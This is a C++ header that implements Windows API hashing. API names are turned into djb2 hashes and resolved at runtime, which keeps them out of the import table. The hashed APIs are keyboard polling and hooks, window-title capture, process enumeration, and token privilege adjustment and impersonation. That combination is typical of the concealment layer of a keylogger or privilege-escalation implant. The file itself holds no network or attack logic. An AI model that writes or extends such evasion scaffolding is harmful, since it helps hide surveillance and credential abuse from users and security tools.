#ifndef API_HASHING_H
#define API_HASHING_H

#include <windows.h>
#include <tlhelp32.h>

// djb2 hash algorithm
constexpr DWORD HashString(const char *str)
{
    DWORD hash = 5381;
    for (const char *p = str; *p; ++p)
    {
        hash = ((hash << 5) + hash) + *p;
    }
    return hash;
}

// Pre-computed API hash constants
namespace APIHash
{
    // KERNEL32.dll process/module APIs
    constexpr DWORD CreateToolhelp32Snapshot = HashString("CreateToolhelp32Snapshot");
    constexpr DWORD Process32FirstW = HashString("Process32FirstW");
    constexpr DWORD Process32NextW = HashString("Process32NextW");
    constexpr DWORD Module32FirstW = HashString("Module32FirstW");
    constexpr DWORD Module32NextW = HashString("Module32NextW");
    constexpr DWORD GetModuleHandleA = HashString("GetModuleHandleA");
    constexpr DWORD GetProcAddress = HashString("GetProcAddress");
    constexpr DWORD LoadLibraryA = HashString("LoadLibraryA");
    constexpr DWORD CloseHandle = HashString("CloseHandle");

    // USER32.dll window hook/input APIs
    constexpr DWORD GetAsyncKeyState = HashString("GetAsyncKeyState");
    constexpr DWORD SetWindowsHookExW = HashString("SetWindowsHookExW");
    constexpr DWORD UnhookWindowsHookEx = HashString("UnhookWindowsHookEx");
    constexpr DWORD CallNextHookEx = HashString("CallNextHookEx");
    constexpr DWORD GetForegroundWindow = HashString("GetForegroundWindow");
    constexpr DWORD GetWindowTextW = HashString("GetWindowTextW");
    constexpr DWORD GetWindowThreadProcessId = HashString("GetWindowThreadProcessId");

    // ADVAPI32.dll token/privilege APIs
    constexpr DWORD AdjustTokenPrivileges = HashString("AdjustTokenPrivileges");
    constexpr DWORD OpenProcessToken = HashString("OpenProcessToken");
    constexpr DWORD LookupPrivilegeValueW = HashString("LookupPrivilegeValueW");
    constexpr DWORD DuplicateTokenEx = HashString("DuplicateTokenEx");
    constexpr DWORD ImpersonateLoggedOnUser = HashString("ImpersonateLoggedOnUser");
    constexpr DWORD CheckTokenMembership = HashString("CheckTokenMembership");
    constexpr DWORD GetTokenInformation = HashString("GetTokenInformation");
}

class APIResolver
{
private:
    static HMODULE g_hKernel32;
    static HMODULE g_hUser32;
    static HMODULE g_hAdvapi32;

    static DWORD HashStringRuntime(const char *str);
    static FARPROC GetFunctionByHash(HMODULE hModule, DWORD functionHash);

public:
    static BOOL Initialize();
    static FARPROC ResolveAPI(DWORD apiHash);

    typedef HANDLE(WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL(WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL(WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
    typedef BOOL(WINAPI *pModule32FirstW)(HANDLE, LPMODULEENTRY32W);
    typedef BOOL(WINAPI *pModule32NextW)(HANDLE, LPMODULEENTRY32W);
    typedef SHORT(WINAPI *pGetAsyncKeyState)(int);
    typedef HHOOK(WINAPI *pSetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);
    typedef BOOL(WINAPI *pUnhookWindowsHookEx)(HHOOK);
    typedef LRESULT(WINAPI *pCallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
    typedef HWND(WINAPI *pGetForegroundWindow)(VOID);
    typedef int(WINAPI *pGetWindowTextW)(HWND, LPWSTR, int);
    typedef DWORD(WINAPI *pGetWindowThreadProcessId)(HWND, LPDWORD);
    typedef BOOL(WINAPI *pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
    typedef BOOL(WINAPI *pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
    typedef BOOL(WINAPI *pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
    typedef BOOL(WINAPI *pDuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
    typedef BOOL(WINAPI *pImpersonateLoggedOnUser)(HANDLE);
};

#define RESOLVE_API(hash) ((decltype(hash##_ptr))APIResolver::ResolveAPI(APIHash::hash))

#endif // API_HASHING_H
